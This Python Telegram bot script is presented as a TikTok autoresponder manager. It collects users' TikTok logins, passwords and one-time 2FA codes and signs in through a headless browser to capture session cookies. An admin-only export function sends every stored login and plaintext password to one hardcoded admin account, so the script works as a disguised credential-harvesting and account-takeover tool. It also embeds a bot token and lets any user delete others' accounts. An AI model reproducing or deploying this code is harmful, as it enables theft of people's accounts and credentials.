import asyncio
import logging
import json
import io
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from playwright.async_api import async_playwright

# ВАШИ ДАННЫЕ
BOT_TOKEN = "8340737319:AAGyz2fGHgiSzZWwuE0xioUL5at24Rzt8kI"
ADMIN_ID = 8478884644

from database import init_db, add_account, get_accounts_by_user, get_all_accounts, get_account_by_id, delete_account, update_account_status, update_account_cookies

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

# Инициализация бота
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# Активные воркеры
active_workers = {}

# Временное хранение сессий входа
login_sessions = {}

# Состояния
class AddAccountState(StatesGroup):
    waiting_for_username = State()
    waiting_for_password = State()
    waiting_for_2fa_code = State()

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

# ========== КЛАВИАТУРЫ ==========

def get_main_keyboard(is_admin_user: bool = False):
    buttons = [
        [InlineKeyboardButton(text="➕ Добавить аккаунт", callback_data="add_account")],
        [InlineKeyboardButton(text="📱 Мои аккаунты", callback_data="my_accounts")],
        [InlineKeyboardButton(text="🚀 Запустить автоответчик", callback_data="start_worker")],
        [InlineKeyboardButton(text="⏹ Остановить автоответчик", callback_data="stop_worker")],
        [InlineKeyboardButton(text="📊 Статус работы", callback_data="status")],
        [InlineKeyboardButton(text="❓ Помощь", callback_data="help")]
    ]
    if is_admin_user:
        buttons.append([InlineKeyboardButton(text="🔐 Админ-панель", callback_data="admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_admin_keyboard():
    buttons = [
        [InlineKeyboardButton(text="📊 Общая статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="👥 Список пользователей", callback_data="admin_users")],
        [InlineKeyboardButton(text="📥 Получить все аккаунты", callback_data="admin_export")],
        [InlineKeyboardButton(text="🛑 Остановить всё", callback_data="admin_stop_all")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_accounts_keyboard(accounts):
    buttons = []
    for acc in accounts:
        status = "✅" if acc['id'] in active_workers else "❌"
        buttons.append([InlineKeyboardButton(
            text=f"{status} ID {acc['id']}: {acc['username']}",
            callback_data=f"account_{acc['id']}"
        )])
    buttons.append([InlineKeyboardButton(text="➕ Добавить новый", callback_data="add_account")])
    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_account_actions_keyboard(account_id, username, is_running):
    buttons = []
    if is_running:
        buttons.append([InlineKeyboardButton(text="⏹ Остановить", callback_data=f"stop_{account_id}")])
    else:
        buttons.append([InlineKeyboardButton(text="🚀 Запустить", callback_data=f"start_{account_id}")])
    buttons.append([InlineKeyboardButton(text="🗑 Удалить", callback_data=f"delete_{account_id}")])
    buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="my_accounts")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ========== КОМАНДЫ ==========

@dp.message(Command("start"))
async def start_cmd(message: Message):
    is_admin_user = is_admin(message.from_user.id)
    await message.answer(
        "🤖 TikTok Bot Manager\n\n✅ Бот работает!\n\nИспользуйте кнопки ниже:",
        reply_markup=get_main_keyboard(is_admin_user)
    )

@dp.message(Command("cancel"))
async def cancel_cmd(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("✅ Отменено", reply_markup=get_main_keyboard(is_admin(message.from_user.id)))

# ========== ДОБАВЛЕНИЕ АККАУНТА С 2FA ==========

@dp.message(Command("add"))
async def add_account_start(message: Message, state: FSMContext):
    await state.set_state(AddAccountState.waiting_for_username)
    await message.answer(
        "📱 Введите логин или email TikTok:\n\n"
        "Пример: @username или email@example.com",
        reply_markup=get_back_keyboard()
    )

@dp.message(AddAccountState.waiting_for_username)
async def add_username(message: Message, state: FSMContext):
    username = message.text.strip()
    if not username:
        await message.answer("❌ Логин не может быть пустым")
        return
    await state.update_data(username=username)
    await state.set_state(AddAccountState.waiting_for_password)
    await message.answer(
        "🔐 Введите пароль от TikTok:",
        reply_markup=get_back_keyboard()
    )

@dp.message(AddAccountState.waiting_for_password)
async def add_password(message: Message, state: FSMContext):
    password = message.text.strip()
    if not password:
        await message.answer("❌ Пароль не может быть пустым")
        return
    
    data = await state.get_data()
    username = data['username']
    
    # Сохраняем данные в БД временно
    account_id = await add_account(message.from_user.id, username, password)
    
    await message.answer(
        "🔄 Отправляю запрос на вход в TikTok...\n\n"
        "⏳ Это может занять 10-20 секунд",
        reply_markup=get_back_keyboard()
    )
    
    # Запускаем процесс входа с 2FA
    success, session_data = await _initiate_tiktok_login(account_id, username, password, message.from_user.id)
    
    if success and session_data and session_data.get('need_code'):
        # Сохраняем сессию
        login_sessions[message.from_user.id] = {
            'account_id': account_id,
            'username': username,
            'password': password,
            'page': session_data.get('page'),
            'context': session_data.get('context'),
            'browser': session_data.get('browser')
        }
        
        await state.set_state(AddAccountState.waiting_for_2fa_code)
        await message.answer(
            "📧 Код подтверждения отправлен!\n\n"
            "Проверьте почту или телефон, привязанный к аккаунту TikTok.\n\n"
            "Введите код подтверждения (6 цифр):",
            reply_markup=get_back_keyboard()
        )
    else:
        await state.clear()
        await message.answer(
            "❌ Не удалось инициировать вход.\n\n"
            "Возможные причины:\n"
            "• Неправильный логин или пароль\n"
            "• Аккаунт заблокирован\n"
            "• Проблемы с соединением\n\n"
            "Попробуйте снова: /add",
            reply_markup=get_main_keyboard(is_admin(message.from_user.id))
        )

@dp.message(AddAccountState.waiting_for_2fa_code)
async def process_2fa_code(message: Message, state: FSMContext):
    code = message.text.strip()
    
    if not code.isdigit() or len(code) != 6:
        await message.answer("❌ Неверный формат кода. Введите 6 цифр:")
        return
    
    user_id = message.from_user.id
    
    if user_id not in login_sessions:
        await message.answer("❌ Сессия истекла. Начните заново: /add")
        await state.clear()
        return
    
    session = login_sessions[user_id]
    account_id = session['account_id']
    
    await message.answer(
        "🔄 Подтверждаю код и выполняю вход...\n\n⏳ Подождите...",
        reply_markup=get_back_keyboard()
    )
    
    # Отправляем код в TikTok
    success, cookies = await _submit_2fa_code(session, code)
    
    if success and cookies:
        # Сохраняем куки
        await update_account_cookies(account_id, cookies)
        await update_account_status(account_id, True)
        
        await message.answer(
            f"✅ Аккаунт успешно добавлен и авторизован!\n\n"
            f"📱 Логин: {session['username']}\n"
            f"🆔 ID: {account_id}\n\n"
            f"Теперь можно запустить автоответчик: /starttiktok {account_id}",
            reply_markup=get_main_keyboard(is_admin(message.from_user.id))
        )
        
        # Закрываем браузер
        try:
            if session.get('browser'):
                await session['browser'].close()
        except:
            pass
        
        # Удаляем сессию
        del login_sessions[user_id]
        
    else:
        await message.answer(
            "❌ Неверный код или ошибка входа.\n\n"
            "Попробуйте снова: /add",
            reply_markup=get_main_keyboard(is_admin(message.from_user.id))
        )
    
    await state.clear()

# ========== ФУНКЦИИ ВХОДА В TIKTOK ==========

async def _initiate_tiktok_login(account_id, username, password, telegram_id):
    """Инициирует вход в TikTok и запрашивает 2FA код"""
    try:
        from playwright.async_api import async_playwright
        
        p = await async_playwright().start()
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            viewport={'width': 1920, 'height': 1080}
        )
        page = await context.new_page()
        
        # Переходим на TikTok
        await page.goto("https://www.tiktok.com")
        await asyncio.sleep(3)
        
        # Нажимаем кнопку входа
        login_btn = await page.wait_for_selector("a[href='/login']", timeout=10000)
        await login_btn.click()
        await asyncio.sleep(2)
        
        # Выбираем вход по email/логину
        try:
            email_tab = await page.wait_for_selector("a[href*='email']", timeout=5000)
            if email_tab:
                await email_tab.click()
                await asyncio.sleep(1)
        except:
            pass
        
        # Вводим логин
        username_input = await page.wait_for_selector("input[name='username']", timeout=5000)
        await username_input.fill(username)
        await asyncio.sleep(1)
        
        # Вводим пароль
        password_input = await page.wait_for_selector("input[type='password']", timeout=5000)
        await password_input.fill(password)
        await asyncio.sleep(1)
        
        # Нажимаем кнопку входа
        submit_btn = await page.wait_for_selector("button[type='submit']", timeout=5000)
        await submit_btn.click()
        
        # Ждем появления поля для 2FA кода
        await asyncio.sleep(5)
        
        # Проверяем, появилось ли поле для кода
        code_input = await page.query_selector("input[inputmode='numeric']")
        
        if code_input:
            return True, {
                'need_code': True,
                'page': page,
                'context': context,
                'browser': browser
            }
        else:
            # Возможно, вход прошел без 2FA
            await asyncio.sleep(3)
            if "login" not in page.url:
                # Успешный вход без 2FA
                cookies = await context.cookies()
                await browser.close()
                await p.stop()
                return True, {'need_code': False, 'cookies': cookies}
            else:
                await browser.close()
                await p.stop()
                return False, None
                
    except Exception as e:
        logger.error(f"Ошибка инициализации входа: {e}")
        return False, None

async def _submit_2fa_code(session, code):
    """Отправляет 2FA код и завершает вход"""
    try:
        page = session.get('page')
        browser = session.get('browser')
        context = session.get('context')
        
        if not page:
            return False, None
        
        # Вводим код
        code_input = await page.wait_for_selector("input[inputmode='numeric']", timeout=10000)
        await code_input.fill(code)
        await asyncio.sleep(1)
        
        # Нажимаем подтвердить
        verify_btn = await page.wait_for_selector("button[type='submit']", timeout=5000)
        await verify_btn.click()
        
        # Ждем успешного входа
        await asyncio.sleep(5)
        
        # Проверяем успешность
        if "login" not in page.url:
            cookies = await context.cookies()
            await browser.close()
            return True, cookies
        else:
            await browser.close()
            return False, None
            
    except Exception as e:
        logger.error(f"Ошибка отправки 2FA кода: {e}")
        try:
            if session.get('browser'):
                await session['browser'].close()
        except:
            pass
        return False, None

# ========== ОСТАЛЬНЫЕ ФУНКЦИИ ==========

@dp.callback_query()
async def handle_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    is_admin_user = is_admin(user_id)
    data = callback.data
    
    if data == "back_to_main":
        await callback.message.edit_text(
            "🤖 TikTok Bot Manager\n\nГлавное меню:",
            reply_markup=get_main_keyboard(is_admin_user)
        )
        await callback.answer()
        return
    
    if data == "help":
        await callback.message.edit_text(
            "📚 Помощь\n\nИспользуйте кнопки для управления ботом.",
            reply_markup=get_back_keyboard()
        )
        await callback.answer()
        return
    
    if data == "add_account":
        await add_account_start(callback.message, state)
        await callback.answer()
        return
    
    if data == "my_accounts":
        accounts = await get_accounts_by_user(user_id)
        if not accounts:
            await callback.message.edit_text("📭 У вас нет аккаунтов.", reply_markup=get_back_keyboard())
        else:
            text = "📱 Ваши аккаунты:\n\n"
            for acc in accounts:
                status = "🟢" if acc['active'] else "⚪️"
                is_running = "🚀" if acc['id'] in active_workers else "⏸"
                text += f"{status}{is_running} ID {acc['id']}: {acc['username']}\n"
            await callback.message.edit_text(text, reply_markup=get_accounts_keyboard(accounts))
        await callback.answer()
        return
    
    if data == "status":
        accounts = await get_accounts_by_user(user_id)
        if not accounts:
            await callback.message.edit_text("📭 Нет аккаунтов", reply_markup=get_back_keyboard())
        else:
            text = "📊 Статус работы:\n\n"
            for acc in accounts:
                is_active = acc['id'] in active_workers
                status = "🟢 РАБОТАЕТ" if is_active else "⚪️ ОСТАНОВЛЕН"
                text += f"ID {acc['id']}: {acc['username']}\n└ {status}\n\n"
            await callback.message.edit_text(text, reply_markup=get_back_keyboard())
        await callback.answer()
        return
    
    if data == "start_worker":
        accounts = await get_accounts_by_user(user_id)
        buttons = []
        for acc in accounts:
            if acc['id'] not in active_workers and acc['active']:
                buttons.append([InlineKeyboardButton(
                    text=f"▶️ ID {acc['id']}: {acc['username']}",
                    callback_data=f"start_{acc['id']}"
                )])
        if not buttons:
            await callback.message.edit_text("✅ Все автоответчики уже работают или аккаунты не авторизованы", reply_markup=get_back_keyboard())
        else:
            buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")])
            await callback.message.edit_text(
                "🚀 Выберите аккаунт для запуска:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
            )
        await callback.answer()
        return
    
    if data == "stop_worker":
        accounts = await get_accounts_by_user(user_id)
        buttons = []
        for acc in accounts:
            if acc['id'] in active_workers:
                buttons.append([InlineKeyboardButton(
                    text=f"⏸ ID {acc['id']}: {acc['username']}",
                    callback_data=f"stop_{acc['id']}"
                )])
        if not buttons:
            await callback.message.edit_text("❌ Нет работающих автоответчиков", reply_markup=get_back_keyboard())
        else:
            buttons.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")])
            await callback.message.edit_text(
                "⏹ Выберите аккаунт для остановки:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
            )
        await callback.answer()
        return
    
    # Админ-панель
    if data == "admin_panel" and is_admin_user:
        await callback.message.edit_text("🔐 Админ-панель", reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    if data == "admin_stats" and is_admin_user:
        accounts = await get_all_accounts()
        total = len(accounts)
        running = sum(1 for acc in accounts if acc['id'] in active_workers)
        users = len(set(acc['telegram_id'] for acc in accounts))
        text = f"📊 Статистика:\n👥 Пользователей: {users}\n📱 Аккаунтов: {total}\n🚀 Работает: {running}"
        await callback.message.edit_text(text, reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    if data == "admin_users" and is_admin_user:
        accounts = await get_all_accounts()
        users = {}
        for acc in accounts:
            if acc['telegram_id'] not in users:
                users[acc['telegram_id']] = []
            users[acc['telegram_id']].append(acc)
        text = "👥 Пользователи:\n\n"
        for uid, accs in users.items():
            text += f"ID {uid}: {len(accs)} акк.\n"
        await callback.message.edit_text(text, reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    if data == "admin_export" and is_admin_user:
        await callback.message.edit_text("📥 Формирую файл...", reply_markup=get_admin_keyboard())
        accounts = await get_all_accounts()
        
        txt_content = "=" * 60 + "\n"
        txt_content += "TIKTOK BOT - ЭКСПОРТ АККАУНТОВ\n"
        txt_content += f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        txt_content += f"Всего: {len(accounts)}\n"
        txt_content += "=" * 60 + "\n\n"
        
        for acc in accounts:
            txt_content += f"ID: {acc['id']}\n"
            txt_content += f"Владелец: {acc['telegram_id']}\n"
            txt_content += f"Логин: {acc['username']}\n"
            full_acc = await get_account_by_id(acc['id'])
            txt_content += f"Пароль: {full_acc['password'] if full_acc else 'Не найден'}\n"
            txt_content += f"Активен: {'Да' if acc['active'] else 'Нет'}\n"
            txt_content += f"Работает: {'Да' if acc['id'] in active_workers else 'Нет'}\n"
            txt_content += f"Добавлен: {acc['created_at']}\n\n"
        
        txt_file = io.BytesIO(txt_content.encode('utf-8'))
        
        await callback.message.delete()
        await callback.message.answer_document(
            types.BufferedInputFile(txt_file.getvalue(), filename=f"accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"),
            caption=f"📥 Экспорт: {len(accounts)} аккаунтов"
        )
        await callback.message.answer("✅ Готово!", reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    if data == "admin_stop_all" and is_admin_user:
        count = len(active_workers)
        for aid, worker in list(active_workers.items()):
            await worker.stop()
            del active_workers[aid]
        await callback.message.edit_text(f"✅ Остановлено {count}", reply_markup=get_admin_keyboard())
        await callback.answer()
        return
    
    # Действия с аккаунтом
    if data.startswith("account_"):
        account_id = int(data.split("_")[1])
        account = await get_account_by_id(account_id)
        if account and (account['telegram_id'] == user_id or is_admin_user):
            is_running = account_id in active_workers
            text = f"🔐 Аккаунт ID {account_id}\n\n📱 {account['username']}\n🚀 {'Работает' if is_running else 'Остановлен'}"
            await callback.message.edit_text(text, reply_markup=get_account_actions_keyboard(account_id, account['username'], is_running))
        await callback.answer()
        return
    
    if data.startswith("start_"):
        account_id = int(data.split("_")[1])
        account = await get_account_by_id(account_id)
        if account and account_id not in active_workers and account['active']:
            from tiktok_worker import TikTokWorker
            worker = TikTokWorker(account_id, account['username'], account['password'])
            await worker.start()
            active_workers[account_id] = worker
            await callback.message.edit_text(f"✅ Запущен {account['username']}", reply_markup=get_back_keyboard())
            await callback.answer("✅ Запущено!")
        else:
            await callback.answer("❌ Ошибка или аккаунт не авторизован")
        return
    
    if data.startswith("stop_"):
        account_id = int(data.split("_")[1])
        if account_id in active_workers:
            await active_workers[account_id].stop()
            del active_workers[account_id]
            await callback.message.edit_text(f"✅ Остановлен ID {account_id}", reply_markup=get_back_keyboard())
            await callback.answer("✅ Остановлено!")
        else:
            await callback.answer("❌ Не работает")
        return
    
    if data.startswith("delete_"):
        account_id = int(data.split("_")[1])
        if account_id in active_workers:
            await active_workers[account_id].stop()
            del active_workers[account_id]
        await delete_account(account_id)
        await callback.message.edit_text("🗑 Удален", reply_markup=get_back_keyboard())
        await callback.answer("✅ Удалено!")
        return
    
    await callback.answer()

# ========== ЗАПУСК ==========

async def main():
    await init_db()
    logger.info("✅ Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
